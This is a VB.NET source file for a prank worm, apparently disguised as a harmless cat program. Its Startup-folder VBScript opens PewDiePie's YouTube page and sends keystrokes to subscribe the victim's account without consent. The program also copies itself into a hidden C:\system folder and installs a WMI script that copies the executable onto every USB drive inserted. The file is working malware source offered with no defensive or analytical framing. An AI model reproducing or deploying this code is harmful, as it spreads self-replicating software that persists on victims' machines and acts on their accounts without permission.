Imports System.IO


Public Class Form1


    Dim tempWrite As System.IO.StreamWriter
    Dim writeTxt As System.IO.StreamWriter
    Dim writeTxt2 As System.IO.StreamWriter
    Dim writeTxt3 As System.IO.StreamWriter
    Dim writeMoVbs As System.IO.StreamWriter

    Dim myPath = "" ''Path whrere it puts the subscribing script 
    Dim myPath2 = "" ''path for where it copies itself
    Dim myPath3 = "" ''path for where the drive listening script is located
    Dim curPath = "" ''path for where the curretn cat.png is located

    ''"C:\Users\Josiah Lauby\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nou.vbs"

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        createSubScript() ''create the subscribing script in startup folder

        copyItself() ''copies this program to a designated location on the C drive

        checkDrive() ''creates the check drive scirpt into the startup folder
    End Sub

    Public Function convertS(startS As String) As String 'take in the strong and convert it to ANSAI type

        Return "test"
    End Function

    Public Function createSubScript() ''function that creates the script that makes u sub to pewdiepie

        myPath = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
        myPath = myPath & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nou.vbs"

        System.IO.File.WriteAllText(myPath, "") 'clears the txt if it already exists

        'tempWrite = File.CreateText(myPath)
        tempWrite = My.Computer.FileSystem.OpenTextFileWriter(myPath, True, System.Text.Encoding.ASCII)

        If File.Exists(myPath) Then

            tempWrite.WriteLine("Dim WshShell")
            tempWrite.WriteLine("Set WshShell = WScript.CreateObject(""WScript.Shell"")")
            tempWrite.WriteLine("WScript.sleep 5000")
            tempWrite.WriteLine("WshShell.Run ""https://www.youtube.com/user/PewDiePie?sub_confirmation=1"", 9")
            tempWrite.WriteLine("WScript.sleep 12000")
            tempWrite.WriteLine("WshShell.SendKeys ""+""")
            tempWrite.WriteLine("WScript.sleep 250")
            tempWrite.WriteLine("WshShell.SendKeys ""{TAB}""")
            tempWrite.WriteLine("WScript.sleep 250")
            tempWrite.WriteLine("WshShell.SendKeys ""{TAB}""")
            tempWrite.WriteLine("WScript.sleep 250")
            tempWrite.WriteLine("WshShell.SendKeys ""{ENTER}""")
            tempWrite.WriteLine("WScript.sleep 2000")
            tempWrite.WriteLine("WshShell.SendKeys ""%{F4}""")
            tempWrite.Close()


        Else
            Console.Write("File does not exist")
        End If
        Console.Read()

        ''File.SetAttributes(myPath, FileAttributes.Hidden) ''sets the script to hidden
        Return 0

    End Function

    Public Function copyItself() ''copies this cat program to a specific file location
        ''creates folder and sets it to hidden, in here we will put the cat program
        myPath2 = "C:\system\"
        System.IO.Directory.CreateDirectory(myPath2)
        File.SetAttributes(myPath2, FileAttributes.Hidden)

        Dim aPath As String
        Dim aName As String

        aName = System.Reflection.Assembly.GetExecutingAssembly.
        GetModules()(0).FullyQualifiedName

        aPath = System.IO.Path.GetDirectoryName(aName)
        curPath = aPath
        Dim fileName = IO.Path.GetFileName(Application.ExecutablePath)

        ''MessageBox.Show("Hello", aPath, MessageBoxButtons.OKCancel)

        ''create text file in that location
        Dim targetTxt = myPath2 & "\if.txt"
        System.IO.File.WriteAllText(targetTxt, "")
        writeTxt = My.Computer.FileSystem.OpenTextFileWriter(targetTxt, True, System.Text.Encoding.ASCII)
        writeTxt.WriteLine(curPath & "\" & fileName)
        writeTxt.Close()

        ''create text file with just name of file
        Dim targetTxt2 = myPath2 & "\nm.txt"
        System.IO.File.WriteAllText(targetTxt2, "")
        writeTxt2 = My.Computer.FileSystem.OpenTextFileWriter(targetTxt2, True, System.Text.Encoding.ASCII)
        writeTxt2.WriteLine(fileName)
        writeTxt2.Close()

        ''create the script that will copy the cat exe to that location
        Dim targetVbs = myPath2 & "\mo.vbs"
        System.IO.File.WriteAllText(targetVbs, "")
        writeMoVbs = My.Computer.FileSystem.OpenTextFileWriter(targetVbs, True, System.Text.Encoding.ASCII)

        ''write script that copies the cat exe to the location its at
        writeMoVbs.WriteLine("scriptdir = CreateObject(" & ControlChars.Quote & "Scripting.FileSystemObject" & ControlChars.Quote & ").GetParentFolderName(WScript.ScriptFullName)")
        writeMoVbs.WriteLine("scriptdir = scriptdir & " & ControlChars.Quote & "\" & ControlChars.Quote)
        writeMoVbs.WriteLine("readFileLoc = " & ControlChars.Quote & ControlChars.Quote)
        writeMoVbs.WriteLine("fileName = scriptdir & " & ControlChars.Quote & "if.txt" & ControlChars.Quote)
        writeMoVbs.WriteLine("Set fso = CreateObject(" & ControlChars.Quote & "Scripting.FileSystemObject" & ControlChars.Quote & ")")
        writeMoVbs.WriteLine("Set f = fso.OpenTextFile(filename)")
        writeMoVbs.WriteLine("Do Until f.AtEndOfStream")
        writeMoVbs.WriteLine("readFileLoc = f.ReadLine")
        writeMoVbs.WriteLine("Loop")
        writeMoVbs.WriteLine("f.Close")
        writeMoVbs.WriteLine("dim filesys")
        writeMoVbs.WriteLine("set filesys=CreateObject(" & ControlChars.Quote & "Scripting.FileSystemObject" & ControlChars.Quote & ")")
        writeMoVbs.WriteLine("If filesys.FileExists(readFileLoc) Then ")
        writeMoVbs.WriteLine("filesys.CopyFile readFileLoc, scriptdir")
        writeMoVbs.WriteLine("End If")

        writeMoVbs.Close()

        ''run the scrpit i write above
        Dim p As New System.Diagnostics.Process
        Dim s As New System.Diagnostics.ProcessStartInfo(targetVbs)
        s.UseShellExecute = True
        s.WindowStyle = ProcessWindowStyle.Normal
        p.StartInfo = s
        p.Start()

        Return 0
    End Function

    Public Function checkDrive() ''creates program that checks for new flash drives inserted to computer

        myPath3 = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
        myPath3 = myPath3 & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ss.vbs"
        System.IO.File.WriteAllText(myPath3, "")
        writeTxt3 = My.Computer.FileSystem.OpenTextFileWriter(myPath3, True, System.Text.Encoding.ASCII)

        writeTxt3.WriteLine("strComputer = " & ControlChars.Quote & "." & ControlChars.Quote)
        writeTxt3.WriteLine("Set objWMIService = GetObject(" & ControlChars.Quote & "winmgmts:\\" & ControlChars.Quote & " & strComputer & " & ControlChars.Quote & "\root\cimv2" & ControlChars.Quote & ")")
        writeTxt3.WriteLine("Set wmiEvent = objWMIService.ExecNotificationQuery( _")
        writeTxt3.WriteLine(ControlChars.Quote & "Select * From __InstanceCreationEvent Within 1" & ControlChars.Quote & " & _")
        writeTxt3.WriteLine(ControlChars.Quote & " Where TargetInstance ISA 'Win32_PnPEntity' and" & ControlChars.Quote & " & _")
        writeTxt3.WriteLine(ControlChars.Quote & " TargetInstance.Description='USB Mass Storage Device'" & ControlChars.Quote & ")")
        writeTxt3.WriteLine("While True")
        writeTxt3.WriteLine("Set objEvent = wmiEvent.NextEvent()")
        writeTxt3.WriteLine("Set objUSB = objEvent.TargetInstance")
        writeTxt3.WriteLine("strName = objUSB.Name")
        writeTxt3.WriteLine("strDeviceID = objUSB.DeviceID")
        writeTxt3.WriteLine(" Set objUSB = Nothing")
        writeTxt3.WriteLine("Set colDrives = objWMIService.ExecQuery( _")
        writeTxt3.WriteLine(ControlChars.Quote & "Select * From Win32_LogicalDisk Where DriveType = 2" & ControlChars.Quote & ")")
        writeTxt3.WriteLine("For Each objDrive in colDrives")
        writeTxt3.WriteLine("strDriveLetter = objDrive.DeviceID")
        writeTxt3.WriteLine("Next")
        writeTxt3.WriteLine("Set colDrives = Nothing")
        writeTxt3.WriteLine("readFileLoc = " & ControlChars.Quote & ControlChars.Quote)
        writeTxt3.WriteLine("filename = " & ControlChars.Quote & "c:\system\nm.txt" & ControlChars.Quote)
        writeTxt3.WriteLine("Set fso = CreateObject(" & ControlChars.Quote & "Scripting.FileSystemObject" & ControlChars.Quote & ")")
        writeTxt3.WriteLine("Set f = fso.OpenTextFile(filename)")
        writeTxt3.WriteLine("Do Until f.AtEndOfStream")
        writeTxt3.WriteLine("readFileLoc = " & ControlChars.Quote & "c:\system\" & ControlChars.Quote & " & f.ReadLine")
        writeTxt3.WriteLine("Loop")
        writeTxt3.WriteLine("f.Close")
        writeTxt3.WriteLine("DestinationFile = strDriveLetter & " & ControlChars.Quote & "\" & ControlChars.Quote)
        writeTxt3.WriteLine("sourceFile = readFileLoc")
        writeTxt3.WriteLine("On Error Resume Next")
        writeTxt3.WriteLine("dim filesys")
        writeTxt3.WriteLine("set filesys=CreateObject(" & ControlChars.Quote & "Scripting.FileSystemObject" & ControlChars.Quote & ")")
        writeTxt3.WriteLine("If filesys.FileExists(SourceFile) Then ")
        writeTxt3.WriteLine("filesys.CopyFile SourceFile, DestinationFile")
        writeTxt3.WriteLine("End If")
        writeTxt3.WriteLine("Err.Clear")
        writeTxt3.WriteLine("Wend")
        writeTxt3.WriteLine("Set wmiEvent = Nothing")
        writeTxt3.WriteLine("Set objWMIService = Nothing")
        writeTxt3.Close()




        ''File.SetAttributes(myPath3, FileAttributes.Hidden) ''sets the script to hidden

        ''run the scrpit i write above
        Dim p As New System.Diagnostics.Process
        Dim s As New System.Diagnostics.ProcessStartInfo(myPath3)
        s.UseShellExecute = True
        s.WindowStyle = ProcessWindowStyle.Normal
        p.StartInfo = s
        p.Start()

        Return 0
    End Function
End Class
